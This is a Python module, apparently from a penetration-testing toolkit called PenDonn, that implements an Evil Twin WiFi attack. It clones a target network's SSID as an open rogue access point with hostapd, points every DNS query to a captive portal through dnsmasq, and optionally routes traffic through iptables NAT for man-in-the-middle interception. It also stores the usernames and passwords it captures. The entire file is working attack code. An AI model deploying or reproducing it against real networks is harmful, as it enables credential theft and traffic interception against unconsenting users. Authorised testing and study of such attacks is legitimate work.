"""
Evil Twin Attack Module

Creates a rogue access point that mimics a legitimate WiFi network
to capture credentials and perform MITM attacks.

Author: PenDonn Team
"""

import logging
import subprocess
import os
import time
import json
from threading import Thread, Event
from datetime import datetime

class EvilTwin:
    """Evil Twin attack implementation"""
    
    def __init__(self, config, db):
        """
        Initialize Evil Twin attack
        
        Args:
            config: Configuration dictionary
            db: Database instance
        """
        self.config = config
        self.db = db
        self.logger = logging.getLogger(__name__)
        
        # Attack configuration
        self.target_ssid = None
        self.target_bssid = None
        self.target_channel = None
        self.attack_interface = None
        self.internet_interface = None
        
        # Attack state
        self.running = False
        self.stop_event = Event()
        self.hostapd_process = None
        self.dnsmasq_process = None
        self.captured_credentials = []
        
        # Paths
        self.hostapd_conf = "/tmp/pendonn_hostapd.conf"
        self.dnsmasq_conf = "/tmp/pendonn_dnsmasq.conf"
        self.captive_portal_dir = "./web/captive_portal"
        
    def start_attack(self, ssid, bssid, channel, attack_interface, internet_interface=None):
        """
        Start Evil Twin attack
        
        Args:
            ssid: Target SSID to clone
            bssid: Target BSSID
            channel: WiFi channel
            attack_interface: Interface for rogue AP
            internet_interface: Interface for internet sharing (optional)
        
        Returns:
            bool: True if attack started successfully
        """
        if self.running:
            self.logger.warning("Evil Twin attack already running")
            return False
        
        self.logger.info(f"Starting Evil Twin attack on {ssid}")
        
        # Store attack parameters
        self.target_ssid = ssid
        self.target_bssid = bssid
        self.target_channel = channel
        self.attack_interface = attack_interface
        self.internet_interface = internet_interface
        
        try:
            # Step 1: Stop NetworkManager interference
            self._stop_network_manager()
            
            # Step 2: Configure attack interface
            self._configure_interface()
            
            # Step 3: Set up DHCP server
            self._setup_dnsmasq()
            
            # Step 4: Set up hostapd (access point)
            self._setup_hostapd()
            
            # Step 5: Set up iptables for internet sharing (if enabled)
            if internet_interface:
                self._setup_internet_sharing()
            
            # Step 6: Start hostapd
            self._start_hostapd()
            
            # Step 7: Start dnsmasq
            self._start_dnsmasq()
            
            # Step 8: Start captive portal web server
            self._start_captive_portal()
            
            self.running = True
            self.logger.info("Evil Twin attack started successfully")
            
            # Log to database
            self.db.add_log("evil_twin", f"Started Evil Twin attack on {ssid}", "INFO")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to start Evil Twin attack: {e}")
            self.stop_attack()
            return False
    
    def stop_attack(self):
        """Stop Evil Twin attack and cleanup"""
        if not self.running:
            return
        
        self.logger.info("Stopping Evil Twin attack")
        self.stop_event.set()
        
        try:
            # Stop hostapd
            if self.hostapd_process:
                self.hostapd_process.terminate()
                self.hostapd_process.wait(timeout=5)
            
            # Stop dnsmasq
            if self.dnsmasq_process:
                self.dnsmasq_process.terminate()
                self.dnsmasq_process.wait(timeout=5)
            
            # Clean up iptables
            self._cleanup_iptables()
            
            # Restore interface
            self._restore_interface()
            
            # Remove config files
            for conf_file in [self.hostapd_conf, self.dnsmasq_conf]:
                if os.path.exists(conf_file):
                    os.remove(conf_file)
            
            # Restart NetworkManager
            self._start_network_manager()
            
            self.running = False
            self.logger.info("Evil Twin attack stopped")
            
            # Log captured credentials
            if self.captured_credentials:
                self.logger.info(f"Captured {len(self.captured_credentials)} credentials")
                self.db.add_log("evil_twin", f"Captured {len(self.captured_credentials)} credentials", "INFO")
            
        except Exception as e:
            self.logger.error(f"Error stopping Evil Twin attack: {e}")
    
    def _stop_network_manager(self):
        """Stop NetworkManager to prevent interference"""
        try:
            subprocess.run(["systemctl", "stop", "NetworkManager"], check=True)
            self.logger.info("Stopped NetworkManager")
        except subprocess.CalledProcessError as e:
            self.logger.warning(f"Could not stop NetworkManager: {e}")
    
    def _start_network_manager(self):
        """Restart NetworkManager"""
        try:
            subprocess.run(["systemctl", "start", "NetworkManager"], check=True)
            self.logger.info("Started NetworkManager")
        except subprocess.CalledProcessError as e:
            self.logger.warning(f"Could not start NetworkManager: {e}")
    
    def _configure_interface(self):
        """Configure attack interface for AP mode"""
        try:
            # Bring interface down
            subprocess.run(["ip", "link", "set", self.attack_interface, "down"], check=True)
            
            # Set to managed mode
            subprocess.run(["iw", self.attack_interface, "set", "type", "managed"], check=True)
            
            # Bring interface up
            subprocess.run(["ip", "link", "set", self.attack_interface, "up"], check=True)
            
            # Assign IP address
            subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", self.attack_interface], check=True)
            
            self.logger.info(f"Configured {self.attack_interface} with IP 10.0.0.1")
            
        except subprocess.CalledProcessError as e:
            raise Exception(f"Failed to configure interface: {e}")
    
    def _restore_interface(self):
        """Restore interface to original state"""
        try:
            subprocess.run(["ip", "addr", "flush", "dev", self.attack_interface], check=False)
            subprocess.run(["ip", "link", "set", self.attack_interface, "down"], check=False)
        except Exception as e:
            self.logger.warning(f"Could not restore interface: {e}")
    
    def _setup_hostapd(self):
        """Create hostapd configuration"""
        config_content = f"""
# PenDonn Evil Twin - hostapd configuration
interface={self.attack_interface}
driver=nl80211
ssid={self.target_ssid}
channel={self.target_channel}
hw_mode=g

# Open network (no encryption) to capture credentials
auth_algs=1
wpa=0

# MAC address (optional - can spoof target BSSID)
# bssid={self.target_bssid}
"""
        
        with open(self.hostapd_conf, 'w') as f:
            f.write(config_content)
        
        self.logger.info("Created hostapd configuration")
    
    def _setup_dnsmasq(self):
        """Create dnsmasq configuration"""
        config_content = f"""
# PenDonn Evil Twin - dnsmasq configuration
interface={self.attack_interface}
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp

# Redirect all DNS queries to captive portal
address=/#/10.0.0.1
"""
        
        with open(self.dnsmasq_conf, 'w') as f:
            f.write(config_content)
        
        self.logger.info("Created dnsmasq configuration")
    
    def _start_hostapd(self):
        """Start hostapd process"""
        try:
            self.hostapd_process = subprocess.Popen(
                ["hostapd", self.hostapd_conf],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            time.sleep(2)  # Wait for hostapd to start
            
            if self.hostapd_process.poll() is not None:
                raise Exception("hostapd failed to start")
            
            self.logger.info("Started hostapd")
            
        except Exception as e:
            raise Exception(f"Failed to start hostapd: {e}")
    
    def _start_dnsmasq(self):
        """Start dnsmasq process"""
        try:
            self.dnsmasq_process = subprocess.Popen(
                ["dnsmasq", "-C", self.dnsmasq_conf, "-d"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            time.sleep(1)  # Wait for dnsmasq to start
            
            if self.dnsmasq_process.poll() is not None:
                raise Exception("dnsmasq failed to start")
            
            self.logger.info("Started dnsmasq")
            
        except Exception as e:
            raise Exception(f"Failed to start dnsmasq: {e}")
    
    def _setup_internet_sharing(self):
        """Set up iptables for internet sharing"""
        try:
            # Enable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
            
            # Set up NAT
            subprocess.run([
                "iptables", "-t", "nat", "-A", "POSTROUTING",
                "-o", self.internet_interface, "-j", "MASQUERADE"
            ], check=True)
            
            subprocess.run([
                "iptables", "-A", "FORWARD",
                "-i", self.attack_interface, "-o", self.internet_interface,
                "-j", "ACCEPT"
            ], check=True)
            
            subprocess.run([
                "iptables", "-A", "FORWARD",
                "-i", self.internet_interface, "-o", self.attack_interface,
                "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"
            ], check=True)
            
            self.logger.info("Set up internet sharing")
            
        except subprocess.CalledProcessError as e:
            self.logger.warning(f"Failed to set up internet sharing: {e}")
    
    def _cleanup_iptables(self):
        """Clean up iptables rules"""
        try:
            subprocess.run(["iptables", "-t", "nat", "-F"], check=False)
            subprocess.run(["iptables", "-F", "FORWARD"], check=False)
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=False)
        except Exception as e:
            self.logger.warning(f"Could not clean up iptables: {e}")
    
    def _start_captive_portal(self):
        """Start captive portal web server"""
        # This will be handled by the existing Flask web server
        # with a new route for captive portal
        self.logger.info("Captive portal will be served by main web interface")
    
    def capture_credential(self, username, password, source_ip):
        """
        Record captured credential
        
        Args:
            username: Username
            password: Password
            source_ip: Source IP address
        """
        credential = {
            'timestamp': datetime.now().isoformat(),
            'ssid': self.target_ssid,
            'username': username,
            'password': password,
            'source_ip': source_ip
        }
        
        self.captured_credentials.append(credential)
        
        # Log to database
        self.db.add_log(
            "evil_twin_capture",
            f"Captured credential from {source_ip}: {username}",
            "WARNING"
        )
        
        self.logger.warning(f"Captured credential: {username} from {source_ip}")
    
    def get_status(self):
        """
        Get attack status
        
        Returns:
            dict: Attack status information
        """
        return {
            'running': self.running,
            'target_ssid': self.target_ssid,
            'target_bssid': self.target_bssid,
            'target_channel': self.target_channel,
            'credentials_captured': len(self.captured_credentials),
            'attack_interface': self.attack_interface
        }

def get_evil_twin(config, db):
    """Factory function to create EvilTwin instance"""
    return EvilTwin(config, db)
